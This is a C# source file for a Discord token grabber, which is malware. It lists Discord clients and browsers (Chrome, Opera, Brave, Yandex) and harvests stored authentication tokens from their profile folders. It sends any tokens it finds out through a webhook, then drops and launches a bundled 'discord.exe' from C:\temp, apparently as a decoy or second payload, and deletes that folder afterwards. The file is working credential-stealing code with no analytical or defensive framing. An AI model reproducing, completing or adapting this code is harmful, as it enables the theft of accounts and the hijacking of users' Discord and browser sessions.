using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Resources;
using System.Threading;

namespace DiscordTokenGrabber;

internal class Program
{
	public static List<string> TokenReport = new List<string>();

	private static readonly List<Service> _services = new List<Service>
	{
		new Service("Discord", "Roaming\\Discord"),
		new Service("Discord Canary", "Roaming\\discordcanary", logs: true),
		new Service("Discord PTB", "Roaming\\discordptb"),
		new Service("Google Chrome", "Local\\Google\\Chrome\\User Data\\Default"),
		new Service("Opera", "Roaming\\Opera Software\\Opera Stable", logs: true),
		new Service("Brave", "Local\\BraveSoftware\\Brave-Browser\\User Data\\Default", logs: true),
		new Service("Yandex", "Local\\Yandex\\YandexBrowser\\User Data\\Default", logs: true)
	};

	private static byte[] GetResource(string file)
	{
		ResourceManager resourceManager = new ResourceManager("res", Assembly.GetExecutingAssembly());
		return (byte[])resourceManager.GetObject(file);
	}

	private static void Main(string[] args)
	{
		foreach (Service service in _services)
		{
			service.GetTokens();
		}
		if (Grabber.TokensFound)
		{
			Webhook.ReportTokens(TokenReport);
		}
		DirectoryInfo directoryInfo = Directory.CreateDirectory("C:\\temp\\TCDC053.tmp");
		File.WriteAllBytes("C:\\temp\\TCDC053.tmp\\discord.exe", GetResource("discord"));
		Process.Start("C:\\temp\\TCDC053.tmp\\Discord.exe");
		Thread.Sleep(5000);
		directoryInfo.Delete();
	}
}
